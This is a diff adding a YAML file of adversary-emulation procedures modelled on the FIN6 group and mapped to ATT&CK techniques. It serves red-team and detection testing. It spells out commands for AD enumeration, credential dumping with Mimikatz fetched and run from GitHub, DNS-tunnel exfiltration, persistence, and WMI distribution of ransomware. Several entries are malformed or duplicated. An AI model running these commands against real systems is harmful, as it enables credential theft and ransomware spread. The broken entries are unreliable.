@@ -1,0 +1,1048 @@
+# FIN6.yaml - CALDERA and Atomic style TTPs
+
+# Phase 1: Discovery
+
+- id: e44a39ce-0651-3ddd-df05-f83aa2ffd657
+  name: Enumerate AD person objects
+  description: Find all person objects and output the results to a text file.
+  tactic: discovery
+  technique: 
+    attack_id: T1087.002
+    name: Account Discovery:\ Domain Account
+  cti-source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_discovery
+  procedure_step: 2.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          adfind.exe -f (objectcategory=person) > ad_users.txt
+        payload: adfind.exe
+
+  input_arguments:
+    adfind_exe:
+      description: Path of adfind.exe
+      type: Path
+      default:
+
+    adfind_url:
+      description: Path to download ADFind zip file
+      type: URL
+      default: https://joeware.net/freetools/tools/adfind/index.htm
+
+    adfind_zip_hash:
+      description: File hash of the ADFind zip file
+      type: String
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+      prereq_command: if (Test-Path \#{adfind_exe}) {exit 0} else {else 1}
+      get_prereq_command: $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
+  executor:
+    name: command_prompt 
+    command: adfind.exe -f (objectcategory=person) > ad_users.txt
+
+- id: 5b24eef2-7a7f-fd34-7cab-e588074c59bc
+  name: Enumerate AD computer objects
+  description: Identify all computer objects and output the results to a text file.
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: Remote System Discovery
+  cti-source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_discovery
+  procedure_step: 2.2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          adfind.exe -f (objectcategory=computer) > ad_computers.txt
+        payload: adfind.exe
+
+  input_arguments:
+    adfind_exe:
+      description: Path of adfind.exe
+      type: Path
+      default:
+
+    adfind_url:
+      description: Path to download ADFind zip file
+      type: URL
+      default: https://joeware.net/downloads/dl.php?download=AdFind.zip
+
+    adfind_zip_hash:
+      description: File hash of the ADFind zip file
+      type: String
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+      prereq_command: if (Test-Path \#{adfind_exe}) {exit 0} else {else 1}
+      get_prereq_command: $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
+  executor:
+    name: command_prompt
+    command: adfind.exe -f (objectcategory=computer) > ad_computers.txt
+
+- id: d30692dd-779f-1a40-c947-de23dabbb033
+  name: Enumerate AD Organizational Units
+  description: Enumerate all Organizational Units (OUs) in the domain of the user running the command and output the results to a text file.
+  tactic: discovery
+  technique:
+    attack_id: T1482
+    name: Domain Trust Discovery
+  cti-source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_discovery
+  procedure_step: 2.3
+  platforms:
+    windows:
+      cmd:
+        command: |
+          adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt
+        payload: adfind.exe
+  
+  input_arguments:
+    adfind_exe:
+      description: Path of adfind.exe
+      type: Path
+      default:
+
+    adfind_url:
+      description: Path to download ADFind zip file
+      type: URL
+      default: https://joeware.net/downloads/dl.php?download=AdFind.zip
+
+    adfind_zip_hash:
+      description: File hash of the ADFind zip file
+      type: String
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+      prereq_command: if (Test-Path \#{adfind_exe}) {exit 0} else {else 1}
+      get_prereq_command: $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
+
+  executor: 
+    name: command_prompt
+    command: adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt
+
+- id: 02a96c18-f700-782d-68a8-bd311f6c41dc
+  name: Enumerate AD trust objects
+  description: Performs a full forest search and dumps trust objects to a text file.
+  tactic: discovery
+  technique:
+    attack_id: T1482
+    name: Domain Trust Discovery
+  cti-source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_discovery
+  procedure_step: 2.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt
+        payload: adfind.exe
+
+  input_arguments:
+    adfind_exe:
+      description: Path of adfind.exe
+      type: Path
+      default:
+
+    adfind_url:
+      description: Path to download ADFind zip file
+      type: URL
+      default: https://joeware.net/downloads/dl.php?download=AdFind.zip
+
+    adfind_zip_hash:
+      description: File hash of the ADFind zip file
+      type: String
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+      prereq_command: if (Test-Path \#{adfind_exe}) {exit 0} else {else 1}
+      get_prereq_command: $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
+
+  executor: 
+    name: command_prompt
+    command: adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt
+
+- id: e4cdb5c6-d322-3b6e-ac8e-68b2e8a7dd4c
+  name: Enumerate AD subnets
+  description: List subnets and output the results to a text file.
+  tactic: discovery
+  technique:
+    attack_id: T1016
+    name: System Network Configuration Discovery
+  cti-source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_discovery
+  procedure_step: 2.5
+  platforms:
+    windows:
+      cmd:
+        command: |
+          adfind.exe -gcb -sc trustdmp > ad_subnets.txt
+        payload: adfind.exe
+
+  input_arguments:
+    adfind_exe:
+      description: Path of adfind.exe
+      type: Path
+      default:
+
+    adfind_url:
+      description: Path to download ADFind zip file
+      type: URL
+      default: https://joeware.net/downloads/dl.php?download=AdFind.zip
+
+    adfind_zip_hash:
+      description: File hash of the ADFind zip file
+      type: String
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+      prereq_command: if (Test-Path \#{adfind_exe}) {exit 0} else {else 1}
+      get_prereq_command: $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
+
+  executor: 
+    name: command_prompt
+    command: adfind.exe -gcb -sc trustdmp > ad_subnets.txt
+
+- id: 2738b811-a360-4a4f-3f9d-704343ebab4d
+  name: Enumerate AD groups
+  description: List groups and output the results to a text file.
+  tactic: discovery
+  technique:
+    attack_id: T1069.002
+    name: Permission Groups Discovery:\ Domain Groups
+  cti-source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_discovery
+  procedure_step: 2.6
+  platforms:
+    windows:
+      cmd:
+        command: |
+          adfind.exe -f (objectcategory=group) > ad_group.txt
+        payload: adfind.exe
+
+  input_arguments:
+    adfind_exe:
+      description: Path of adfind.exe
+      type: Path
+      default:
+
+    adfind_url:
+      description: Path to download ADFind zip file
+      type: URL
+      default: https://joeware.net/downloads/dl.php?download=AdFind.zip
+
+    adfind_zip_hash:
+      description: File hash of the ADFind zip file
+      type: String
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+      prereq_command: if (Test-Path \#{adfind_exe}) {exit 0} else {else 1}
+      get_prereq_command: $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
+
+  executor: 
+    name: command_prompt
+    command: adfind.exe -f (objectcategory=group) > ad_group.txt
+
+# Phase 1: Privilege Escalation
+
+- id: a89ea459-97ec-28fd-a552-9d305f023bbe
+  name: PowerSploit Named-Pipe Impersonation
+  description: PowerSploit named-pipe impersonation, similar to the technique used to escalate to SYSTEM-level privileges by FIN6.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1134
+    name: Access Token Manipulation
+  cti-source: 
+  procedure_group: procedure_privesc
+  procedure_step: 3.1
+  platforms:
+    windows:
+      psh:
+        command: |
+          powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'
+
+# Phase 1: Credential Access
+
+- id: ff77db3d-ded1-f8da-9885-8dfc097edec0
+  name: PowerSploit Invoke-Mimikatz
+  description: Dump credentials from memory via PowerShell by invoking a remote Mimikatz script, similar to the procedure used by FIN6.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: OS Credential Dumping: LSASS Memory - Invoke-Mimikatz
+  cti-source: https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/
+  procedure_group: procedure_privesc
+  procedure_step: 3.2
+  platforms:
+    windows:
+      psh:
+        command: |
+          powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+
+- id: 97412b40-4940-8da1-8bff-6f11d42bca26
+  name: WCE Credential Access
+  description: FIN6 is reported to have used WCE to access credentials on at least one occasion.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: OS Credential Dumping: LSASS Memory - Windows Credential Editor (WCE)
+  cti-source: https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf
+  procedure_group: procedure_cred_access
+  procedure_step: 3.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          wce.exe -w -o wce_creds.txt
+        payload: wce.exe
+
+  input_arguments:
+    output_file:
+      description: Path where resulting data should be placed
+      type: Path
+      default: "%temp%\\wce-output.txt"
+
+    wce_exe:
+      description: Path of Windows Credential Editor
+      type: Path
+      default:
+
+    wce_url:
+      description: Path to download Windows Credential Editor zip file
+      type: URL
+      default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+
+    wce_zip_hash:
+      description: File hash of the Windows Credential Editor zip file
+      type: string
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Windows Credential Editor must exist on disk at specified location (#{wce_exe})
+      prereq_command: if (Test-Path #{wce_exe}) {exit 0} else {else 1}
+      get_prereq_command: $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}) {
+      Expand-Archive $zippath $parentpath\wce -Force
+      Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
+      Remove-Item $zippath, $parentpath\wce -Recurse
+      }
+
+  executor: 
+    name: command_prompt
+    elevation_required: true
+    command: #{wce_exe} -o #{output_file}
+    cleanup_command: del "#{output_file}" >null 2>&1
+
+# Phase 1: Collection
+
+- id: fd27fe6c-4846-6e94-aef9-f6bc21ab0f0e
+  name: Compress Files with 7zip (7.exe)
+  description: Compress text files for exfiltration staging using 7zip, renamed to 7.exe
+  tactic: collection
+  technique:
+    attack_id: T1560.001
+    name: Archive Collected Data:\ Archive via Utility
+  cti-source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_collection
+  procedure_step: 4.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          7.exe a -mx3 ad.7z ad_*
+        payload: 7.exe
+
+  input_arguments:
+    7_exe:
+      description: Path of 7.exe
+      type: Path
+      default:
+
+    7_url:
+      description: Path to download 7zip file
+      type: URL
+      default: https://7-zip.org/a/7z1900-x64.exe
+
+    7_hash:
+      description: File hash of the 7 zip file
+      type: String
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: 7.exe must exist on disk at specified location (#{7_exe})
+      prereq_command: if (Test-Path \#{7_exe}) {exit 0} else {else 1}
+      get_prereq_command: $parentpath = Split-Path "#{7_exe}"; $zippath = "$parentpath\7.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{7_url}" "$zippath" \#{7_hash}) {
+      Expand-Archive $zippath $parentpath\7 -Force
+      Move-Item $parentpath\7\7.exe "#{7_exe}"
+      Remove-Item $zippath, $parentpath\7 -Recurse
+      }
+  
+  executor: 
+    name: command_prompt
+    command: 7.exe a -mx3 ad.7z ad_*
+
+# Phase 1/2: Exfiltration
+
+- id: 78d94199-7e0e-642b-81a6-32f8e419a7ac
+  name: Exfiltrate Data via SSH
+  description: Initiate an interactive SSH session with a remote server
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: Exfiltration Over Web Service:\ Exfiltration to Cloud Storage
+  cti-source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_exfiltration
+  procedure_step: 4.2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          putty.exe -ssh #{user}@#{exfil_server}
+        payload: putty.exe
+
+  input_arguments:
+    putty_exe:
+      description: Path of putty.exe
+      type: Path
+      default:
+
+    putty_url:
+      description: Path to download putty file
+      type: URL
+      default: https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe
+
+    putty_hash:
+      description: File hash of the putty exe file
+      type: String
+      default:
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      putty.exe must exist on disk at specified location (#{putty_exe})
+    prereq_command: |
+      if (Test-Path \#{putty_exe}) {exit 0} else {else 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{putty_exe}"; $zippath = "$parentpath\putty.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{putty_url}" "$zippath" \#{putty_hash}) {
+      Expand-Archive $zippath $parentpath\putty -Force
+      Move-Item $parentpath\putty\putty.exe "#{putty_exe}"
+      Remove-Item $zippath, $parentpath\putty -Recurse
+      }
+
+  input_arguments:
+    user:
+      description: username
+      type: string
+      default: 
+    exfil_server:
+      description: hostname or IP address
+      type: string
+      default: 127.0.0.1
+
+  executor: 
+    name: command_prompt
+    command: putty.exe -ssh #{user}@#{exfil_server}
+
+# Phase 2: Execution - Point of Sale (POS)
+
+- id: e4027dff-280b-6964-32be-b35a40c4a493
+  name: PsExec Remote Command
+  description: Use PsExec to execute a command on a remote host. FIN6 is reported to have used a variant of PsExec to execute code on remote hosts.
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: System Services:\ Service Execution
+  cti-source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_pos_execution
+  procedure_step: 5.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          PsExec.exe \\#{remote_host} #{remote_command}
+        payload: PsExec.exe
+
+  input_arguments:
+    psexec_exe:
+      description: Path to Psexec
+      type: string
+      default: "C:\\PSTools\\PsExec.exe"
+    remote_host:
+      description: Remote host or IP address
+      type: string
+      default: localhost
+    remote_command:
+      description: Remote command to run
+      type: string
+      default: calc.exe
+  
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        PsExec must exist on disk at specified location (#{psexec_exe})
+      prereq_command: |
+        if (Test-Path "#{psexec_exe}") {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
+        Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+        New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
+        Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: #{psexec_exe} \\#{remote_host} #{remote_command}
+
+- id: 661efd66-d876-71de-88ee-ba9ec4328154
+  name: WMIC Remote Process Execution
+  description: WMIC to execute a process on a remote host. Specify the remote IP using node parameter.  FIN6 is reported to have used WMI to execute code on remote systems.
+  tactic: execution
+  technique:
+    attack_id: 1047
+    name: Windows Management Instrumentation
+  cti-source: https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24
+  procedure_group: procedure_pos_execution
+  procedure_step: 5.3
+  platforms:
+    windows:
+      cmd:
+        command: |
+          wmic /node:"#{node}" process call create #{process_to_execute}
+          
+  input_arguments:
+    node:
+      description: IP address
+      type: string
+      default: 127.0.0.1
+    process_to_execute:
+      description: Name or path of process to execute
+      type: string
+      default: notepad.exe
+  
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: wmic /node:"#{node}" process call create #{process_to_execute}
+    cleanup_command: wmic /node "#{node}" process where name='#{process_to_execute}' delete >nul 2>&1
+
+# Phase 2: Persistence - Point of Sale (POS)
+
+- id: 44d82f6f-f367-cdb7-4a65-a9e5717b1a21
+  name: Registry Run Keys
+  description: FIN6 utilizes cmd to execute Registry Run Keys
+  tactic: persistence
+  technique: 
+    attack_id: T1547.001
+    name: Boot or Logon Autostart Execution:\ Registry Run Keys / Startup Folder
+  cti-source: https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems
+  procedure_group: procedure_pos_persistence
+  procedure_step: 5.4.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v #{value_name} /t REG_SZ /d #{data} "C:\#{path},workerInstance /f
+  
+  input_arguments:
+    value_name:
+      description: Name of the registry entry to be added
+      type: string
+      default:
+    data:
+      description: Data for new registry entry
+      type: string
+      default:
+    path:
+      description: Path
+      type: string
+      default:
+
+  executor: 
+    name: command_prompt
+    command: "C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v #{value_name} /t REG_SZ /d #{data} "C:\#{path},workerInstance /f
+
+- id: 0864a91a-ae17-1cce-cb89-d4f8f2854699
+  name: Scheduled Task Persistence
+  description: FIN6 utilizes cmd to execute Scheduled Tasks
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: Scheduled Task/Job:\ Scheduled Task
+  cti-source: https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems
+  procedure_group: procedure_pos_persistence
+  procedure_step: 5.4.2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "C:\Windows\System32\schtasks.exe" /create /tn #{task_name} /tr "rundll32.exe "C:\#{path}",WorkerInstance" /sc #{schedule} /ru System"
+  
+  input_arguments:
+    task_name:
+      description: Task Name
+      type: string
+      default:
+    path:
+      description: Path of task to run
+      type: string
+      default:
+    schedule:
+      description: Schedule for task (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT)
+      type: string
+      default:
+
+  executor: 
+    name: command_prompt
+    command: "C:\Windows\System32\schtasks.exe" /create /tn #{task_name} /tr "rundll32.exe "C:\#{path}",WorkerInstance" /sc #{schedule} /ru System"
+
+# Phase 2: Exfiltration - Point of Sale (POS)
+
+- id: e74554b8-0bc9-3d50-f5a4-e45421925b49
+  name: dnscat2-powershell Exfiltration
+  description: Powershell to execute POS data exfiltration over DNS tunnel via dnscat2
+  tactic: exfiltration
+  technique: 
+    attack_id: T1048.003
+    name: Exfiltration Over Alternative Protocol:\ Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+  cti-source: https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24
+  procedure_group: procedure_pos_exfiltration
+  procedure_step: 5.5
+  platforms:
+    windows:
+      psh:
+        command: |
+          import-module #{file_path}\\dnscat2.ps1
+          Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd
+        payload: dnscat2.ps1
+  
+  input_arguments:
+    dnscat_ps1:
+      description: Path of dnscat2.ps1
+      type: Path
+      default:
+
+    dnscat2_url:
+      description: Path to download dnscat2 .ps1 file
+      type: URL
+      default: https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1
+
+    dnscat2_hash:
+      description: File hash of the dnscat2 .ps1 file
+      type: String
+      default:
+
+  dependency_executor_name: dnscat2.ps1
+  dependencies:
+  - description: |
+      dnscat2.ps1 must exist on disk at specified location (#{dnscat_ps1})
+    prereq_command: |
+      if (Test-Path \#{dnscat_ps1}) {exit 0} else {else 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{dnscat_ps1}"; $zippath = "$parentpath\dnscat2.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{dnscat2_url}" "$zippath" \#{dnscat2_hash}) {
+      Expand-Archive $zippath $parentpath\dnscat2 -Force
+      Move-Item $parentpath\dnscat2\dnscat2.exe "#{dnscat_ps1}"
+      Remove-Item $zippath, $parentpath\dnscat2 -Recurse
+      }
+  
+  input_arguments:
+    dnscat2_server:
+      description: IP address
+      type: string
+      default: 127.0.0.1
+
+  executor: 
+    name: powershell
+    command: Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd
+
+# Phase 2: Execution - Ransomware
+
+- id: b393c022-329a-0c52-ab1f-eb594ee8d3cd
+  name: WMI Ransomware Distribution
+  description: FIN6 utilizes WMI to distribute ransomware to intended targets
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentation
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_distribution
+  procedure_step: 7.1.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start wmic /node:#{Ransomware_recipient} /user:#{"domain_username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+
+  input_arguments:
+    Ransomware_recipient:
+      description: Hostname or IP address
+      type: string
+      default: 127.0.0.1
+    domain_username:
+      description: domain\\username
+      type: string
+      default: user
+    password:
+      description: user password
+      type: string
+      default: 
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 127.0.0.1
+
+  executor: 
+    name: command_prompt
+    command: start wmic /node:#{Ransomware_recipient} /user:#{"domain_username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+
+# Phase 2: Lateral Movement - Ransomware
+
+- id: f50f8f39-2fb0-8fe3-9e2d-9af38aee447d
+  name: Copy Ransomware
+  description: FIN6 utilizes cmd to copy ransomware to an internal distribution server
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.002
+    name: Remote Services:\ SMB/Windows Admin Shares
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_lateral_movement
+  procedure_step: 7.1.2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
+  
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 127.0.0.1
+
+  executor: 
+    name: command_prompt
+    command: start copy sss.exe \\#{internal_IP}\c$\windows\temp\
+
+- id: e45dc48f-45f1-b2d2-850c-4a15385c1646
+  name: Copy Distribution Scripts
+  description: FIN6 utilizes cmd to copy distribution scripts to an internal distribution server
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.002
+    name: Remote Services:\ SMB/Windows Admin Shares
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_lateral_movement
+  procedure_step: 7.1.3
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
+    
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 127.0.0.1
+
+  executor: 
+    name: command_prompt
+    command: start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
+
+- id: 6ffca252-9eb0-bac0-e3dd-35c9e7c6fae0
+  name: Copy Kill Scripts
+  description: FIN6 utilizes cmd to copy kill scripts to an internal distribution server
+  tactic: lateral_movement
+  technique:
+    attack_id: T1021.002
+    name: Remote Services:\ SMB/Windows Admin Shares
+  cti-source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_copy
+  procedure_step: 7.1.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy \#{batch_file} \\#{internal_IP}\c$\windows\temp\
+  
+  input_arguments:
+  internal_IP:
+    description: Hostname or IP address
+    type: string
+    default: 127.0.0.1
+  batch_file:
+    description: windows.bat or kill.bat
+    type: string
+
+  executor: 
+    name: command_prompt
+    command: copy \#{batch_file} \\#{internal_IP}\c$\windows\temp\
+
+# Phase 2: Execution - Ransomware
+
+- id: 5599b7cf-6e8d-93c1-2311-e953dd0fbd2a
+  name: Distribute Ransomware via WMI
+  description: FIN6 utilizes WMI to distribute ransomware to intended targets 
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentation
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html 
+  procedure_group: procedure_ransomware_distribute
+  procedure_step: 7.2.1 
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+  
+  input_arguments:
+    internal_IP:
+        description: Hostname or IP address
+        type: string
+        default: 127.0.0.1
+    domain_user:
+        description: Domain and username
+        type: string
+    password:
+        description: Remote host or IP address
+        type: string
+
+  executor: 
+    name: command_prompt
+    elevation_required: true
+    command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+
+- id: 5dcbd042-e8e5-af3f-e055-7284e4d5112c
+  name: Distribute Kill Scripts via WMI
+  description: FIN6 has utilized WMI to distribute kill scripts to intended targets 
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentation
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_distribute
+  procedure_step: 7.2.2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\#{batch_file} c:\windows\temp\"
+
+  input_arguments:
+    internal_IP:
+        description: Hostname or IP address
+        type: string
+        default: 127.0.0.1
+    domain_user:
+        description: Domain and username
+        type: string
+    password:
+        description: Valid Password
+        type: string
+    batch_file:
+        description: windows.bat or kill.bat
+        type: string
+
+  executor: 
+    name: command_prompt
+    elevation_required: true
